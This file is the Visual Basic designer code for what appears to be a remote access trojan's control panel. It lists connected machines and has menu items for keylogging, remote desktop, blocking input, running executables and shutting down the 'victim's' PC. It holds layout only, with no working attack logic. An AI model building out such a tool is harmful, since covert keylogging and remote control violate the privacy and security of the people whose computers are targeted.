<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim ListViewGroup1 As System.Windows.Forms.ListViewGroup = New System.Windows.Forms.ListViewGroup("ListViewGroup", System.Windows.Forms.HorizontalAlignment.Left)
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.FileManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UsernameOfVictimsPCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PortsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyLoggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutDownComputerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartPCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogoffPCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HibernatePCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BlockInputsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UnbloackInputsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunExecutableFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InvokeAssemblyToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseClientToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.ContextMenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ListView1
        '
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader2, Me.ColumnHeader5})
        Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.ListView1.Dock = System.Windows.Forms.DockStyle.Fill
        ListViewGroup1.Header = "ListViewGroup"
        ListViewGroup1.Name = "ListViewGroup1"
        Me.ListView1.Groups.AddRange(New System.Windows.Forms.ListViewGroup() {ListViewGroup1})
        Me.ListView1.Location = New System.Drawing.Point(0, 0)
        Me.ListView1.Name = "ListView1"
        Me.ListView1.Size = New System.Drawing.Size(738, 254)
        Me.ListView1.TabIndex = 0
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Computername"
        Me.ColumnHeader1.Width = 118
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Username"
        Me.ColumnHeader3.Width = 140
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Process"
        Me.ColumnHeader4.Width = 125
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "IPAddress"
        Me.ColumnHeader2.Width = 236
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Port"
        Me.ColumnHeader5.Width = 111
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.White
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FileManagerToolStripMenuItem, Me.ProcessManagerToolStripMenuItem, Me.UsernameOfVictimsPCToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.KeyLoggerToolStripMenuItem, Me.ShutDownComputerToolStripMenuItem, Me.RestartPCToolStripMenuItem, Me.LogoffPCToolStripMenuItem, Me.HibernatePCToolStripMenuItem, Me.BlockInputsToolStripMenuItem, Me.UnbloackInputsToolStripMenuItem, Me.RunExecutableFileToolStripMenuItem, Me.InvokeAssemblyToolStripMenuItem, Me.CloseClientToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(178, 312)
        '
        'FileManagerToolStripMenuItem
        '
        Me.FileManagerToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.FileManagerToolStripMenuItem.ForeColor = System.Drawing.Color.RoyalBlue
        Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
        Me.FileManagerToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.FileManagerToolStripMenuItem.Text = "File Manager"
        '
        'ProcessManagerToolStripMenuItem
        '
        Me.ProcessManagerToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue
        Me.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem"
        Me.ProcessManagerToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.ProcessManagerToolStripMenuItem.Text = "Process Manager"
        '
        'UsernameOfVictimsPCToolStripMenuItem
        '
        Me.UsernameOfVictimsPCToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PortsToolStripMenuItem})
        Me.UsernameOfVictimsPCToolStripMenuItem.ForeColor = System.Drawing.Color.Fuchsia
        Me.UsernameOfVictimsPCToolStripMenuItem.Name = "UsernameOfVictimsPCToolStripMenuItem"
        Me.UsernameOfVictimsPCToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.UsernameOfVictimsPCToolStripMenuItem.Text = "Update Connection"
        '
        'PortsToolStripMenuItem
        '
        Me.PortsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem2})
        Me.PortsToolStripMenuItem.Name = "PortsToolStripMenuItem"
        Me.PortsToolStripMenuItem.Size = New System.Drawing.Size(101, 22)
        Me.PortsToolStripMenuItem.Text = "Ports"
        '
        'ToolStripMenuItem2
        '
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(98, 22)
        Me.ToolStripMenuItem2.Text = "5000"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(128, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'KeyLoggerToolStripMenuItem
        '
        Me.KeyLoggerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.KeyLoggerToolStripMenuItem.Name = "KeyLoggerToolStripMenuItem"
        Me.KeyLoggerToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.KeyLoggerToolStripMenuItem.Text = "KeyLogger"
        '
        'ShutDownComputerToolStripMenuItem
        '
        Me.ShutDownComputerToolStripMenuItem.Name = "ShutDownComputerToolStripMenuItem"
        Me.ShutDownComputerToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.ShutDownComputerToolStripMenuItem.Text = "Shutdown PC"
        '
        'RestartPCToolStripMenuItem
        '
        Me.RestartPCToolStripMenuItem.Name = "RestartPCToolStripMenuItem"
        Me.RestartPCToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.RestartPCToolStripMenuItem.Text = "Restart PC"
        '
        'LogoffPCToolStripMenuItem
        '
        Me.LogoffPCToolStripMenuItem.Name = "LogoffPCToolStripMenuItem"
        Me.LogoffPCToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.LogoffPCToolStripMenuItem.Text = "Logoff PC"
        '
        'HibernatePCToolStripMenuItem
        '
        Me.HibernatePCToolStripMenuItem.Name = "HibernatePCToolStripMenuItem"
        Me.HibernatePCToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.HibernatePCToolStripMenuItem.Text = "Hibernate PC"
        '
        'BlockInputsToolStripMenuItem
        '
        Me.BlockInputsToolStripMenuItem.Name = "BlockInputsToolStripMenuItem"
        Me.BlockInputsToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.BlockInputsToolStripMenuItem.Text = "Block Inputs"
        '
        'UnbloackInputsToolStripMenuItem
        '
        Me.UnbloackInputsToolStripMenuItem.Name = "UnbloackInputsToolStripMenuItem"
        Me.UnbloackInputsToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.UnbloackInputsToolStripMenuItem.Text = "Unbloack Inputs"
        '
        'RunExecutableFileToolStripMenuItem
        '
        Me.RunExecutableFileToolStripMenuItem.Name = "RunExecutableFileToolStripMenuItem"
        Me.RunExecutableFileToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.RunExecutableFileToolStripMenuItem.Text = "Invoke exe"
        '
        'InvokeAssemblyToolStripMenuItem
        '
        Me.InvokeAssemblyToolStripMenuItem.Name = "InvokeAssemblyToolStripMenuItem"
        Me.InvokeAssemblyToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.InvokeAssemblyToolStripMenuItem.Text = "Invoke Assembly"
        '
        'CloseClientToolStripMenuItem
        '
        Me.CloseClientToolStripMenuItem.Name = "CloseClientToolStripMenuItem"
        Me.CloseClientToolStripMenuItem.Size = New System.Drawing.Size(177, 22)
        Me.CloseClientToolStripMenuItem.Text = "Close Client"
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 1
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(738, 254)
        Me.Controls.Add(Me.ListView1)
        Me.Name = "Form1"
        Me.Text = " If it Stops Working Then Press ESC To Close"
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents ListView1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents FileManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UsernameOfVictimsPCToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyLoggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ShutDownComputerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartPCToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LogoffPCToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents HibernatePCToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BlockInputsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UnbloackInputsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PortsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RunExecutableFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InvokeAssemblyToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseClientToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Public WithEvents Timer1 As System.Windows.Forms.Timer

End Class
